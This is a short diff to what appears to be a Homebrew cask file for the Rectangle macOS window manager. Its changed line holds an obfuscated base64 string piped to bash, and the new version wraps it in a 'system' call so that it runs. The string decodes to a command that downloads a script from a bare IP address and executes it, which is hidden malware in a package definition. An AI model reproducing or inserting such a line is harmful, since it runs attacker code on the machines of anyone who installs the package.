@@ -8,7 +8,7 @@ cask "rectangle" do
   name "Rectangle"
   desc "Move and resize windows in macOS using keyboard shortcuts"
   homepage "https://rectangleapp.com/"
-  echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
   auto_updates true
 
   app "Rectangle.app"
